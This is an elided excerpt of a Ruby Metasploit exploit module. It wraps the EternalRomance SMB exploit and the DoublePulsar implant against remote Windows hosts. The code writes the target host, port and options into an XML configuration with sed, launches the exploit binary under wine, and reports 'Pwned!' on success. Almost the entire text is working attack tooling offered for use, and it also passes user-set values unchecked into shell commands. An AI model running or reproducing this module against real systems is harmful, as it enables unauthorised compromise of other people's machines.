...
class MetasploitModule < Msf::Exploit::Remote
  ...
  def initialize(info = {})
	...
	register_options([
		...
		OptString.new('ETERNALROMANCEPATH',[true,'Path directory of EternalRomance','/root/EternalRomance-Doublepulsar-Metasploit/deps/']),
		OptString.new('DOUBLEPULSARPATH',[true,'Path directory of Doublepulsar','/root/EternalRomance-Doublepulsar-Metasploit/deps/']),
  ...
  print_status('Generating EternalRomance XML data')
  cp = `cp #{datastore['ETERNALROMANCEPATH']}/Eternalromance-1.4.0.Skeleton.xml #{datastore['ETERNALROMANCEPATH']}/Eternalromance-1.4.0.xml`
  sed = `sed -i 's/%RHOST%/#{datastore['RHOST']}/' #{datastore['ETERNALROMANCEPATH']}/Eternalromance-1.4.0.xml`
  sed = `sed -i 's/%RPORT%/#{datastore['RPORT']}/' #{datastore['ETERNALROMANCEPATH']}/Eternalromance-1.4.0.xml`
  sed = `sed -i 's/%TIMEOUT%/#{datastore['TIMEOUT']}/' #{datastore['ETERNALROMANCEPATH']}/Eternalromance-1.4.0.xml`
  ...
  sed = `sed -i 's/%TARGET%/#{objective}/' #{datastore['ETERNALROMANCEPATH']}/Eternalromance-1.4.0.xml`
  ...
  print_status('Launching EternalRomance...')
  output = `cd #{datastore['ETERNALROMANCEPATH']}; wine Eternalromance-1.4.0.exe`
  if output =~ /=-=-WIN-=-=/
  	print_good("Pwned! EternalRomance success!")
